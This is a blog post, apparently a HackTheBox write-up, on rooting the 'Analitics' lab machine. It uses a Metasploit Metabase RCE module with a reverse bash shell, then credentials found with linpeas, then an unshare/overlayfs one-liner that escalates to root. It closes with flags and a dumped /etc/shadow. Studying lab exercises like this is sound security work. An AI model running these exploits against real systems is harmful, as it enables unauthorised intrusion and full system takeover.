---
layout: post
title: HTB{Analitics}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, linux]
---
<!--cut-->

* TOC
{:toc}


### USER:

Scan [IP]:

Add line `10.10.11.233  analytical.htb data.analytical.htb` to `etc/hosts`.

```text
msf6 > search metabase

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE
```


```text
msf6 exploit(linux/http/metabase_setup_token_rce) > options 

Module options (exploit/linux/http/metabase_setup_token_rce):

   Name       Current Setting      Required  Description
   ----       ---------------      --------  -----------
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     data.analytical.htb  yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                             oit/basics/using-metasploit.html
   RPORT      80                   yes       The target port (TCP)
   SSL        false                no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                    yes       The URI of the Metabase Application
   VHOST                           no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.130     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```
Use 'linpeas.sh':


```text
META_USER=metalytics
META_PASS=An4lytics_ds20223#

```

Connect with ssh `metalytics` with password: `An4lytics_ds20223#`.

```text
┌──(kali㉿kali)-[~/htb/machines/Analitics/CVE-2023-38646]
└─$ ssh metalytics@10.10.11.233
Last login: Tue Oct 17 11:44:37 2023 from 10.10.14.84
metalytics@analytics:~$ cat user.txt 
406ff67f3fdeedd0eaeb146324bc48b2

```
### ROOT:


While reviewing the results of linpeas, it was discovered that the machine’s version was Ubuntu 22.04.3. The search for vulnerabilities pertaining to this version was initiated.

```text
metalytics@analytics:~$ hostnamectl
 Static hostname: analytics
       Icon name: computer-vm
         Chassis: vm
      Machine ID: 97985f393ecf4d86b4acd0b422f7d8c8
         Boot ID: f14e7387a3d04b63ad3c52f0b1ef0744
  Virtualization: vmware
Operating System: Ubuntu 22.04.3 LTS              
          Kernel: Linux 6.2.0-25-generic
    Architecture: x86-64
 Hardware Vendor: VMware, Inc.
  Hardware Model: VMware Virtual Platform                        -      
```



```text
metalytics@analytics:/tmp/asd$ unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
root@analytics:/tmp/asd# cd /root
root@analytics:/root# cat root.txt 
dc860d11b2f7261f87fe7949d9ffca27
root@analytics:/root# cat /etc/shadow
root:$y$j9T$aVUkVU8LWFNEuXdwrOIJH.$jF8hy0vMzBJTvu/.HkzP0E4ZObo1I.frOPRVj2ktqM2:19576:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-timesync:*:19405:0:99999:7:::
pollinate:*:19405:0:99999:7:::
sshd:*:19405:0:99999:7:::
syslog:*:19405:0:99999:7:::
uuidd:*:19405:0:99999:7:::
tcpdump:*:19405:0:99999:7:::
tss:*:19405:0:99999:7:::
landscape:*:19405:0:99999:7:::
fwupd-refresh:*:19405:0:99999:7:::
usbmux:*:19474:0:99999:7:::
lxd:!:19474::::::
metalytics:$y$j9T$juJFLKOECgSAR5LiOX1Or.$LevBUAgKibrIsqHCjXhY2ND3inwq40NcwaK6pK/XFS1:19572:0:99999:7:::
_laurel:!:19577::::::
root@analytics:/root# 

```
